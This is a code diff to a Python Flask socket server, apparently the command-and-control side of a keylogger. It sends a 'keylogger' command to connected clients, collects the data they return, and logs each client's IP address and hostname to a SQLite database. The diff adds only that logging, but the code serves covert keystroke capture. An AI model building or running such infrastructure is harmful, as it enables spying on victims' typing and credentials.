@@ -23,11 +23,11 @@ app = Flask(__name__)
 is_logged_in = False
 data_received = ""  
 
+
 def handle_client(client_socket,client_address):
     global data_received  
     while True:
         try:
-            # client_socket, client_address = server_socket.accept()
             print('Nhận kết nối từ', client_address)
             client_socket.send('keylogger'.encode('utf-8'))
 
@@ -69,7 +69,22 @@ def handle_client(client_socket,client_address):
             break
         finally:
             client_socket.close()
-            
+def add_connection(address, name ):
+    
+    conn = sqlite3.connect('PBL.db')
+    cursor = conn.cursor()
+
+    # Chèn dữ liệu vào bảng user
+    insert_data_query = '''
+    INSERT OR IGNORE INTO connect (address, name) VALUES (?, ?);    
+    '''
+
+    cursor.execute(insert_data_query, (address, name))
+    conn.commit()
+
+    # Đóng kết nối
+    conn.close()
+        
 def start_socket_server():
     global client_socket
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -83,6 +98,12 @@ def start_socket_server():
         while True:
             client_socket, client_address = server_socket.accept()
             print(f"Got connection from {client_address}")
+            try:
+                host_name = socket.gethostbyaddr(client_address[0])[0]
+                print(f"Host name: {host_name}")
+                add_connection(client_address[0], host_name)
+            except socket.herror:
+                print("Unable to get host name")   
 
             # Tạo một luồng mới để xử lý kết nối của client
             client_thread = threading.Thread(
